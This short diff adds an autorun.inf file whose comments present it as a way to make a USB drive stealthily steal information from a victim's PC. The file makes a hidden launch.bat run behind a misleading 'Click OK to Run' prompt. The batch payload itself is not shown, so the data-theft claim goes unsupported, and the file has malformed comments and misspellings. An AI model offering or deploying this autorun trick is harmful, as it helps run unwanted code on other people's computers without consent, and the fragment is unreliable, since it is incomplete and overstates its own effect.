@@ -1,0 +1,10 @@
+//the foloowing code when pasted to usb will make it a special usb that can steal information from the victims pc
+//stealthyly
+
+[autorun]
+icon=drive.ico
+open=launch.bat
+action=Click OK to Run
+shell\open\command=launch.bat
+
+\\save the above script as .inf file i.e. autorun.inf
